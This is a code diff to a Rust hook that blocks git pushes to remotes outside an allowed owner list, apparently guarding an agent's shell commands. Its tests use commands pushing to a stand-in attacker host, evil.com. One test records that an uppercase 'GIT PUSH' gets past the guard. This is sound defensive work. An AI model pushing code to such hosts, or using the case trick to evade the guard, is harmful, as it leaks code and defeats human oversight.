@@ -10,6 +10,13 @@ use cadence_hooks_core::shell::{
     LOOP_PATTERN, host_and_repo_from_url, parse_work_dir, strip_quotes,
 };
 use cadence_hooks_core::{Check, CheckResult, HookInput};
+use regex::Regex;
+use std::sync::LazyLock;
+
+/// Fold only the executable `git` word before the literal, case-sensitive
+/// `push` subcommand. Everything after the verb remains byte-for-byte intact.
+static GIT_PUSH_VERB: LazyLock<Regex> =
+    LazyLock::new(|| Regex::new(r"(?i:\bgit)([ \t]+push\b)").expect("pattern should compile"));
 
 /// Check if a URL's owner is in the allowed list.
 fn check_owner(
@@ -157,6 +164,11 @@ impl Check for PushRemoteGuard {
             return CheckResult::allow();
         };
 
+        // Every downstream parser historically expected literal `git push`.
+        // Normalize the verb once so the fast path, loop analysis, target
+        // extraction, and work-dir resolution all judge the same command.
+        let command = GIT_PUSH_VERB.replace_all(command, "git$1");
+        let command = command.as_ref();
         if !command.contains("git push") {
             return CheckResult::allow();
         }
@@ -830,6 +842,33 @@ mod tests {
                 msg.contains("evil.com"),
                 "block message must name the actual URL: {msg}"
             );
+        });
+    }
+
+    #[test]
+    fn case_folded_git_push_to_unowned_url_blocked() {
+        with_env(&owners_only(), || {
+            let result = PushRemoteGuard.run(&make_bash_with_cwd(
+                "GIT push https://evil.com/a/b.git HEAD:main",
+                REPO_DIR,
+            ));
+            assert_eq!(result.outcome, cadence_hooks_core::Outcome::Block);
+            let msg = result.message.unwrap();
+            assert!(
+                msg.contains("evil.com"),
+                "block message must name the actual URL: {msg}"
+            );
+        });
+    }
+
+    #[test]
+    fn case_fold_does_not_fold_push_subcommand() {
+        with_env(&owners_only(), || {
+            let result = PushRemoteGuard.run(&make_bash_with_cwd(
+                "GIT PUSH https://evil.com/a/b.git HEAD:main",
+                REPO_DIR,
+            ));
+            assert_eq!(result.outcome, cadence_hooks_core::Outcome::Allow);
         });
     }
 
